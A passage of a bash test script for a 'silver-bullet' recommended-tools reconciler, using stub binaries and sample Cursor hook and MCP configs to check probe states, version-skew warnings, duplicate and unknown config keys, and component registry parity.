  && echo "$rtk_skip_fail" | jq -e '.canonical_state != "ready"' >/dev/null 2>&1 \
  && pass "D10 vendor skip does not PASS rtk with missing hook" \
  || fail "D10 vendor skip does not PASS rtk with missing hook (${rtk_skip_fail:-empty})"

printf '{"hooks":{"preToolUse":[{"command":"rtk hook cursor","matcher":"Shell"}]}}\n' \
  >"${D10_HOME}/.cursor/hooks.json"
rtk_skip_ok="$(d10_probe probe-rtk.sh rt_probe_rtk 2>/dev/null || true)"
echo "$rtk_skip_ok" | jq -e '.evidence | index("vendor_skip") != null' >/dev/null 2>&1 \
  && echo "$rtk_skip_ok" | jq -e '.canonical_state == "ready"' >/dev/null 2>&1 \
  && pass "D10 rtk records vendor_skip when remaining checks pass" \
  || fail "D10 rtk records vendor_skip when remaining checks pass (${rtk_skip_ok:-empty})"

# Graphify skill/package skew helper
cat >"${D10_BIN}/graphify" <<'EOF'
#!/usr/bin/env bash
echo "warning: skill is from graphify 0.9.35, package is 0.9.48. Run 'graphify install' to update." >&2
echo "graphify 0.9.48"
exit 0
EOF
chmod +x "${D10_BIN}/graphify"
gfy_skew="$(
  RT_PROJECT_ROOT="$D10_PROJ" RT_HOST=cursor RT_MODE=verify RT_REPO_ROOT="$REPO_ROOT" \
    HOME="$D10_HOME" PATH="${D10_BIN}:${PATH}" \
    bash -c '
      set -euo pipefail
      source "$1/scripts/lib/recommended-tools/common.sh"
      rt_init_paths
      source "$1/scripts/lib/recommended-tools/probe-graphify.sh"
      if rt_probe_graphify_skill_package_skew; then echo SKEW; else echo NOSKEW; fi
    ' _ "$REPO_ROOT" 2>/dev/null || true
)"
[[ "$gfy_skew" == *SKEW* ]] \
  && pass "D10 graphify skill/package skew helper detects CLI warning" \
  || fail "D10 graphify skill/package skew helper detects CLI warning (${gfy_skew:-empty})"

# duplicate_key alias on leanctx duplicate MCP
d10_enable leanctx
printf '#!/usr/bin/env bash\necho "lean-ctx 3.9.9"; exit 0\n' >"${D10_BIN}/lean-ctx"
chmod +x "${D10_BIN}/lean-ctx"
cat >"${D10_HOME}/.cursor/mcp.json" <<'EOF'
{
  "mcpServers": {
    "leanctx": { "command": "lean-ctx", "env": {
      "LEANCTX_MCP_TOOL_PREFIX": "lctx_",
      "LEANCTX_DISABLE_SHELL_MCP": "1",
      "LEANCTX_DISABLE_SANDBOX_MCP": "1",
      "LEANCTX_DISABLE_FETCH_MCP": "1",
      "LEANCTX_DISABLE_FTS": "1"
    }},
    "lean-ctx": { "command": "lean-ctx" }
  }
}
EOF
lc_dup="$(d10_probe probe-leanctx.sh rt_probe_leanctx 2>/dev/null || true)"
echo "$lc_dup" | jq -e '.evidence | index("duplicate_key") != null' >/dev/null 2>&1 \
  && echo "$lc_dup" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
  && pass "D10 leanctx FAILs duplicate_key (not D22-downgraded)" \
  || fail "D10 leanctx FAILs duplicate_key (${lc_dup:-empty})"

# unknown_key in recommended_tools JSON
jq '.recommended_tools.not_a_real_tool = {"enabled_by_user": true}' \
  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
unk_out="$(bash "$RECONCILE" --project-root "$D10_PROJ" --host cursor --mode verify --format json 2>/dev/null || true)"
echo "$unk_out" | jq -e '.unknown_keys | index("not_a_real_tool") != null' >/dev/null 2>&1 \
  && pass "reconciler reports unknown_keys for extra recommended_tools id" \
  || fail "reconciler reports unknown_keys for extra recommended_tools id"
jq 'del(.recommended_tools.not_a_real_tool)' \
  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"

# Unknown component id is unsupported / no installer
if ! grep -q 'rt_run_component omni' "$REPO_ROOT/scripts/reconcile-recommended-tools.sh"; then
  pass "unknown component id is not dispatched as installer"
else
  fail "unknown component id is not dispatched as installer"
fi

# F-7-1 parity: every recommended_tools key + cross_tool is in RT_COMPONENT_IDS, registry, rt_run_component
parity_ok=1
while IFS= read -r key; do
  grep -q "$key" "$REPO_ROOT/scripts/lib/recommended-tools/common.sh" || parity_ok=0
  grep -q "$key" "$REPO_ROOT/hooks/lib/recommended-tools-registry.sh" || parity_ok=0
  grep -q "rt_run_component $key" "$REPO_ROOT/scripts/reconcile-recommended-tools.sh" || parity_ok=0
done < <(jq -r '.recommended_tools | keys[]' "$REPO_ROOT/templates/silver-bullet.config.json.default")
grep -q 'rt_run_component cross_tool' "$REPO_ROOT/scripts/reconcile-recommended-tools.sh" || parity_ok=0
[[ "$parity_ok" -eq 1 ]] && pass "F-7-1 config↔allowlist↔registry↔rt_run_component parity" \
  || fail "F-7-1 config↔allowlist↔registry↔rt_run_component parity"

export RT_SKIP_VENDOR_DOCTOR=1

rm -rf "$D10_HOME" "$D10_PROJ" "$D10_BIN"
export HOME="$TEST_HOME"

echo ""
echo "Results: $PASS passed, $FAIL failed"
[[ "$FAIL" -eq 0 ]] || exit 1
